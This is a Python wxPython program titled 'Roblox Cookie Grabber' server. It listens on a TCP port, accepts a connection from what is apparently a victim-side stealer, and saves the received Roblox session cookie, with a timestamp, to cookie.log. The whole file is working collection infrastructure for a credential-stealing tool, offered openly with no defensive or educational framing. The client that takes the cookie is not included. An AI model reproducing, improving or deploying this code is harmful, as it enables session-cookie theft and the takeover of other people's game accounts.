from datetime import datetime
import socket
import threading
import wx
import subprocess

from modules.template import GUIserver


class Frame(GUIserver):
    def __init__(self, parent, title):
        super(Frame, self).__init__(parent, title=title, size=(800, 800))

        self.btnToggleRun.Bind(wx.EVT_BUTTON, self.onBtnToggleRun)

        self.tbIP.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)
        self.tbPORT.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)

        # get print value at windows console
        self.tbConsole.AppendText(
            '''
** Roblox Cookie Server **
** Made by: github@whrgo **
** Version: 0.2 **
'''
        )
        self.tbConsole.AppendText("---------------------------\n")

        try:
            self.tbConsole.AppendText(
                subprocess.check_output("ipconfig", shell=True).decode())
        except:
            pass

        # self.tbIP.SetValue(ip_address)

        self.Show()
        self.Centre()

    def onTextEnter(self, event):
        self.ADDR = (str(self.tbIP.GetValue()), int(self.tbPORT.GetValue()))

        ServerStartThread = threading.Thread(target=self.run)
        ServerStartThread.start()

    def onBtnToggleRun(self, event):
        if self.btnToggleRun.Label.startswith("Run"):
            self.onStartServer()
            self.btnToggleRun.Label = "Stop Server"
        else:
            self.stop(event)
            self.btnToggleRun.Label = "Run Server"

    def onStartServer(self):
        try:
            self.tbConsole.Clear()

            addr_ip = str(self.tbIP.GetLineText(0))
            addr_port = int(self.tbPORT.GetLineText(0))

            self.ADDR = (str(addr_ip), int(addr_port))
        except Exception as e:
            self.print(e)
            return

        ServerStartThread = threading.Thread(
            target=self.run)
        ServerStartThread.start()

    def run(self):
        self.tbConsole.Clear()
        addr = self.ADDR

        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind(addr)
            self.s.listen(10)
        except Exception as e:  # exception while connecting
            self.print(e)
            return

        wx.MessageBox("Server started successfully!")
        self.print(
            f"Server Started! (Server is listening at {addr[0]}:{addr[1]})")

        sock, ad = self.s.accept()  # NEW CONNECTION FOUND

        self.print(
            f"New connection found at {ad}"
        )

        while True:
            data = sock.recv(1024).decode()
            if not data:
                break
            if data == 'False':
                self.print("No cookie found!")
                break
            self.print(f"New roblox cookie found!")
            self.print("Saving cookie as log...")
            self.saveLog(data)
            self.print("Cookie saved successfully!")

            break
        sock.close()

    def stop(self, event):
        self.s.close()
        wx.MessageBox("Server stopped successfully!")
        self.tbConsole.Clear()

    def saveLog(self, cookie):
        try:
            with open("cookie.log", "w") as f:
                f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                f.write(cookie + "\n")
        except:
            self.print("Error while saving cookie log!")
            self.print(cookie)
            return

    def print(self, string):
        if self.tbConsole.GetLineText(0):
            self.tbConsole.AppendText("\n")
        self.tbConsole.AppendText(string)


if __name__ == '__main__':
    app = wx.App()
    frame = Frame(None,  'Server (Roblox Cookie Grabber)')
    app.MainLoop()
